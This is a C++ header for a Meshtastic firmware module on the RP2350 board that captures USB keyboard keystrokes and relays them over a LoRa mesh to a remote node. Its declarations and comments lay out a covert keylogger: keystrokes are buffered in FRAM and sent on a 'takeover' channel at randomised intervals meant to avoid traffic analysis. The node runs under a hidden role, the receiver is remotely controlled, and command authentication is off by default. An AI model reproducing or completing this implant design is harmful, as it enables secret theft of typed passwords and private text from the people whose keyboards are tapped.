/**
 * @file USBCaptureModule.h
 * @brief USB keyboard capture module for Meshtastic (RP2350 only)
 *
 * This module captures USB keyboard keystrokes using PIO on Core 1 and
 * makes them available to Core 0 for mesh transmission. Implements proper
 * Meshtastic Module API for remote control and status queries.
 *
 * Architecture (v7.0):
 *  - Inherits from SinglePortModule for mesh message handling
 *  - Inherits from OSThread for periodic USB capture operations
 *  - Uses custom port 490 for keystroke data
 *  - Uses channel 1 "takeover" with PSK for mesh broadcast
 *  - Core1: USB capture via PIO → FRAM storage
 *  - Core0: FRAM polling → mesh transmission + message handling
 *
 * SPDX-License-Identifier: GPL-3.0-only
 */

#pragma once

#include "../mesh/SinglePortModule.h"
#include "../platform/rp2xx0/usb_capture/keystroke_queue.h"
#include "../platform/rp2xx0/usb_capture/formatted_event_queue.h"
#include "../platform/rp2xx0/usb_capture/psram_buffer.h"
#include "../platform/rp2xx0/usb_capture/common.h"
#include "concurrency/OSThread.h"

#ifdef HAS_FRAM_STORAGE
#include "FRAMBatchStorage.h"
extern FRAMBatchStorage *framStorage;
#endif
/**
 * @brief Keystroke buffer configuration constants
 */
#define KEYSTROKE_BUFFER_SIZE     500       /**< Total buffer size in bytes */
#define EPOCH_SIZE                10        /**< Epoch timestamp size (ASCII digits) */
#define DELTA_SIZE                2         /**< Delta value size in bytes */
#define DELTA_MARKER              0xFF      /**< Marker byte for delta-encoded Enter keys */
#define DELTA_TOTAL_SIZE          3         /**< Total delta encoding size (marker + 2-byte delta) */
#define DELTA_MAX_SAFE            65000     /**< Maximum safe delta value before auto-finalization */
#define KEYSTROKE_DATA_START      EPOCH_SIZE
#define KEYSTROKE_DATA_END        (KEYSTROKE_BUFFER_SIZE - EPOCH_SIZE)

/**
 * @brief Port and channel configuration (v7.0)
 *
 * Custom port 490 in private range (256-511) for USB capture protocol.
 * Channel 1 "takeover" with PSK encryption for mesh broadcast.
 */
#define USB_CAPTURE_PORTNUM       490       /**< Custom port for USB capture (private range 256-511) */
#define USB_CAPTURE_CHANNEL_INDEX 1         /**< Channel 1 "takeover" for mesh broadcast */

/**
 * @brief Transmission and timing configuration constants (v7.6)
 *
 * Randomized transmission interval (40s-4min) reduces mesh congestion,
 * avoids traffic analysis, and improves battery usage.
 * Batches accumulate in FRAM until transmission window.
 */
#define TX_INTERVAL_MIN_MS        40000     /**< Minimum interval between transmissions (40 seconds) */
#define TX_INTERVAL_MAX_MS        240000    /**< Maximum interval between transmissions (4 minutes) */
#define STATS_LOG_INTERVAL_MS     60000     /**< Statistics logging interval (60 seconds) */
#define CORE1_LAUNCH_DELAY_MS     100       /**< Delay after Core1 reset before launch */
#define RUNONCE_INTERVAL_MS       60000     /**< Module runOnce() polling interval (60 seconds) */

/**
 * @brief ACK-Based Reliable Transmission (v6.0)
 *
 * Batches are only deleted from FRAM after receiving explicit ACK from receiver.
 * Uses exponential backoff for retries: 30s -> 60s -> 120s (capped at 2 min).
 */
#define ACK_TIMEOUT_INITIAL_MS    30000     /**< Initial ACK timeout (30 seconds) */
#define ACK_MAX_RETRIES           3         /**< Maximum retry attempts before giving up */
#define ACK_BACKOFF_MULTIPLIER    2         /**< Timeout doubles on each retry */
#define ACK_MAX_TIMEOUT_MS        120000    /**< Maximum timeout cap (2 minutes) */

/**
 * @brief Protocol Version Header (REQ-PROTO-001)
 *
 * All transmitted batches include a versioned header with magic marker.
 * Format: [magic:2][version:2][batch_id:4][data:N]
 * Magic marker enables backwards-compatible detection of old vs new format.
 *
 * Detection logic (in receiver):
 * - If bytes[0..1] == 0x55 0x4B ("UK"), it's new format (parse version, batch_id at offset 4)
 * - Otherwise, it's old format (batch_id at offset 0, no version)
 */
#define USB_CAPTURE_PROTOCOL_MAGIC_0        0x55  /**< Magic byte 0 ('U') */
#define USB_CAPTURE_PROTOCOL_MAGIC_1        0x4B  /**< Magic byte 1 ('K' for USB Keylog) */
#define USB_CAPTURE_PROTOCOL_VERSION_MAJOR  1     /**< Major version (breaking changes) */
#define USB_CAPTURE_PROTOCOL_VERSION_MINOR  0     /**< Minor version (backwards compatible) */
#define USB_CAPTURE_PROTOCOL_HEADER_SIZE    4     /**< Magic(2) + Version(2) = 4 bytes */

/**
 * @brief Keystroke Simulation Mode (for testing without USB keyboard)
 *
 * When USB_CAPTURE_SIMULATE_KEYS is defined, the module generates fake keystroke
 * batches at regular intervals for testing the transmission pipeline.
 * This bypasses Core1/PIO entirely and injects directly into FRAM storage.
 */
#ifdef USB_CAPTURE_SIMULATE_KEYS
#define SIM_INTERVAL_MS           15000     /**< Interval between simulated batches (15 seconds) */
#define SIM_MAX_MESSAGE_LEN       100       /**< Maximum simulated message length */
#define SIM_BATCH_COUNT           5         /**< Number of simulated batches before stopping (0 = infinite) */
#endif

/**
 * @brief Buffer size configuration constants
 */
#define MAX_DECODED_TEXT_SIZE     233       /**< Maximum size - fits single LoRa packet (v7.2) */
#define MAX_COMMAND_RESPONSE_SIZE 200       /**< Maximum size for command response text */
#define MAX_LINE_BUFFER_SIZE      128       /**< Maximum size for log line buffer */
#define MAX_COMMAND_LENGTH        64        /**< Maximum length for parsed commands (increased for auth prefix) */
#define MAX_TEST_PAYLOAD_SIZE     500       /**< Maximum length for TEST command payload */
#define MAX_CLIENT_NAME_LENGTH    20        /**< Maximum length for client name (e.g., "ste_1234") */

/**
 * @brief Command Authentication (REQ-SEC-001)
 *
 * Protects sensitive commands (START, STOP, TEST) with optional auth token.
 * Read-only commands (STATUS, STATS, DUMP) allowed without auth.
 *
 * Configuration (platformio.ini):
 *   -DUSB_CAPTURE_AUTH_TOKEN=\"mysecret\"
 *
 * Authenticated command format: "AUTH:<token>:<command>"
 *   Example: "AUTH:mysecret:START"
 *
 * If USB_CAPTURE_AUTH_TOKEN is not defined or empty, auth is disabled
 * and all commands work without the AUTH: prefix (backwards compatible).
 */
#ifndef USB_CAPTURE_AUTH_TOKEN
#define USB_CAPTURE_AUTH_TOKEN ""           /**< Empty = no auth required (backwards compatible) */
#endif
#define USB_CAPTURE_AUTH_PREFIX   "AUTH:"   /**< Command prefix for authenticated commands */
#define USB_CAPTURE_AUTH_PREFIX_LEN 5       /**< Length of "AUTH:" */
#define USB_CAPTURE_AUTH_MAX_TOKEN_LEN 32   /**< Maximum token length */

/**
 * @brief Character encoding constants
 */
#define PRINTABLE_CHAR_MIN        32        /**< Minimum printable ASCII character (space) */
#define PRINTABLE_CHAR_MAX        127       /**< Maximum printable ASCII character (DEL) */

/**
 * @brief USB Capture Module command types (sent via mesh packets)
 *
 * Simple text-based protocol for easy testing and debugging.
 * Commands are case-insensitive ASCII strings.
 */
enum USBCaptureCommand {
    CMD_UNKNOWN = 0,
    CMD_STATUS,      // "STATUS" - Get module status (enabled, buffer stats, node name)
    CMD_START,       // "START"  - Start USB capture
    CMD_STOP,        // "STOP"   - Stop USB capture
    CMD_STATS,       // "STATS"  - Get detailed statistics
    CMD_DUMP,        // "DUMP"   - Dump complete PSRAM buffer state (debug)
    CMD_TEST         // "TEST <text>" - Inject test text without keyboard
    /* Node configuration via Meshtastic phone app (PKI admin) */
};

/**
 * @brief USB Capture Module for RP2350
 *
 * Hybrid architecture combining:
 *  1. SinglePortModule: Mesh message handling for remote control
 *  2. OSThread: Periodic USB capture and buffer processing
 *
 * Features:
 *  - Remote start/stop capture via mesh
 *  - Remote status and statistics queries
 *  - Automatic keystroke broadcasting
 *  - Multi-core architecture (Core0: mesh, Core1: capture)
 *
 * Message Protocol:
 *  - Port: TEXT_MESSAGE_APP (1)
 *  - Channel: "takeover" (channel index 1)
 *  - Encoding: ASCII text commands
 *  - Commands: STATUS, START, STOP, STATS
 *  - Responses: ASCII text with status information
 */
class USBCaptureModule : public SinglePortModule, public concurrency::OSThread
{
  public:
    /**
     * @brief Constructor
     * Initializes both SinglePortModule (for mesh) and OSThread (for periodic ops)
     */
    USBCaptureModule();

    /**
     * @brief Initialize the module
     * Sets up USB capture hardware and launches Core1
     * @return true if initialization successful
     */
    bool init();

  protected:
    // ==================== MeshModule Interface ====================

    /**
     * @brief Handle received mesh packets
     * Processes remote control commands (STATUS, START, STOP, STATS)
     * Executes commands and sends replies immediately
     *
     * @param mp Received mesh packet
     * @return ProcessMessage::STOP if handled, CONTINUE otherwise
     */
    virtual ProcessMessage handleReceived(const meshtastic_MeshPacket &mp) override;

    // ==================== OSThread Interface ====================

    /**
     * @brief Main loop - runs on Core 0 periodically
     * Handles PSRAM buffer processing and mesh transmission
     *
     * @return Update interval in milliseconds (100ms)
     */
    virtual int32_t runOnce() override;

  private:
    // ==================== Core State ====================

    keystroke_queue_t *keystroke_queue;
    formatted_event_queue_t *formatted_queue;
    capture_controller_t controller;
    bool core1_started;
    bool capture_enabled;  // Can be toggled via mesh commands

    // Direct message target (captured from first command sender)
    // TODO: Add SET_TARGET command to manually configure target node
    NodeNum targetNode = 0;  // 0 = no target set, non-zero = send DMs to this node

    /* Note: Client name and visibility now use Meshtastic's owner.long_name
     * and owner.role (CLIENT_HIDDEN) - no separate storage needed */

    // ==================== ACK-Based Reliable Transmission (v6.0) ====================

    /**
     * @brief Batch ID generation (v7.5)
     *
     * Batch IDs are generated using RTC + random to ensure uniqueness across:
     * - Device reboots (RTC component)
     * - Multiple devices on same channel (random component)
     * - FRAM clears (no sequential counter to reset)
     *
     * Format: Upper 16 bits = RTC seconds, Lower 16 bits = random
     * Generated inline in processPSRAMBuffers(), no member variable needed.
     */

    /**
     * @brief Pending transmission state (single-at-a-time model)
     *
     * Only one batch can be in-flight at a time - FRAM holds the rest.
     * Batch is deleted from FRAM only after ACK received.
     */
    struct {
        uint32_t batch_id;       /**< Batch ID being waited on (0 = no pending) */
        uint32_t packet_id;      /**< Meshtastic packet ID for this batch */
        uint32_t send_time;      /**< millis() when sent */
        uint32_t timeout_ms;     /**< Current timeout value (doubles on retry) */
        uint8_t retry_count;     /**< Number of retries so far */
    } pendingTx = {0, 0, 0, ACK_TIMEOUT_INITIAL_MS, 0};

    // ACK statistics
    uint32_t ack_success_count = 0;   /**< Successful ACKs received */
    uint32_t ack_timeout_count = 0;   /**< Batches failed after max retries */
    uint32_t ack_retry_count = 0;     /**< Total retry attempts */

#ifdef USB_CAPTURE_SIMULATE_KEYS
    // ==================== Simulation Mode State ====================

    uint32_t sim_last_batch_time = 0;  /**< Last simulation batch timestamp */
    uint32_t sim_batch_count = 0;      /**< Number of batches generated */
    bool sim_enabled = true;           /**< Simulation active flag */
#endif

    // ==================== Command Processing ====================

    /**
     * @brief Parse command from mesh packet payload
     * @param payload Command string (ASCII)
     * @param len Payload length
     * @return Parsed command type
     */
    USBCaptureCommand parseCommand(const uint8_t *payload, size_t len);

    /**
     * @brief Execute received command
     * @param cmd Command to execute
     * @param payload Original command payload (for CMD_TEST text extraction)
     * @param payload_len Length of payload
     * @param response Buffer for response text
     * @param max_len Maximum response buffer size
     * @return Length of response text
     */
    size_t executeCommand(USBCaptureCommand cmd, const uint8_t *payload, size_t payload_len,
                         char *response, size_t max_len);

    /**
     * @brief Get current module status
     * @param response Buffer for status text
     * @param max_len Maximum buffer size
     * @return Length of status text
     */
    size_t getStatus(char *response, size_t max_len);

    /**
     * @brief Get detailed statistics
     * @param response Buffer for stats text
     * @param max_len Maximum buffer size
     * @return Length of stats text
     */
    size_t getStats(char *response, size_t max_len);

    // ==================== USB Capture Operations ====================

    /**
     * @brief Process PSRAM buffers and transmit them
     * Core0's main responsibility - read complete buffers from PSRAM and transmit
     *
     * Called from runOnce() every 100ms
     */
    void processPSRAMBuffers();

    /**
     * @brief Decode binary keystroke buffer into human-readable text
     * Converts raw buffer data (with delta encoding) into plain text
     *
     * @param buffer Source buffer with binary keystroke data
     * @param output Destination buffer for decoded text
     * @param max_len Maximum output buffer size
     * @return Length of decoded text
     */
    size_t decodeBufferToText(const psram_keystroke_buffer_t *buffer,
                              char *output, size_t max_len);

    /**
     * @brief Send buffer data as direct message to target node
     * Sends to targetNode (captured from first command sender)
     * If no target set, silently skips transmission
     * @param data Pointer to data buffer
     * @param len Length of data to send
     * @param batchId Batch ID to include in header for ACK correlation
     * @return Packet ID if queued successfully, 0 if failed or no target
     */
    uint32_t sendToTargetNode(const uint8_t *data, size_t len, uint32_t batchId);

    // ==================== Core1 Health Monitoring (REQ-OPS-001) ====================

    /**
     * @brief Check if Core1 is alive and healthy
     *
     * Evaluates Core1 health based on:
     * - Whether Core1 has started
     * - USB connection status
     * - Time since last keystroke capture
     * - Error count thresholds
     *
     * Updates g_core1_health.status based on evaluation.
     *
     * @return true if Core1 is operating normally, false if stalled/error
     */
    bool isCore1Alive();

    /**
     * @brief Last time health check was performed (millis)
     * Used to rate-limit health status updates
     */
    uint32_t lastHealthCheckTime = 0;

    // ==================== ACK Tracking (v6.0) ====================

    /**
     * @brief Check for ACK timeout and handle retry/failure
     * Called from runOnce() before processing new batches.
     * Implements exponential backoff: 30s -> 60s -> 120s (capped).
     */
    void checkPendingTimeout();

    /**
     * @brief Resend the pending batch after timeout
     * Re-reads batch from FRAM (not deleted until ACK) and retransmits.
     * @return true if resend successful, false if error
     */
    bool resendPendingBatch();

    /**
     * @brief Handle incoming ACK response for pending transmission
     * Parses "ACK:0x<batch_id>" format and deletes FRAM batch on match.
     * @param mp The received mesh packet (PRIVATE_APP port)
     * @return true if this was an ACK for our pending batch
     */
    bool handleAckResponse(const meshtastic_MeshPacket &mp);

#ifdef USB_CAPTURE_SIMULATE_KEYS
    // ==================== Simulation Mode (v6.1) ====================

    /**
     * @brief Generate and store a simulated keystroke batch
     *
     * Creates a fake batch with test content and writes it directly to FRAM.
     * Called from runOnce() when simulation mode is enabled.
     * Bypasses Core1/PIO entirely for testing the transmission pipeline.
     *
     * @return true if batch was generated and stored successfully
     */
    bool simulateKeystrokes();
#endif
};

extern USBCaptureModule *usbCaptureModule;
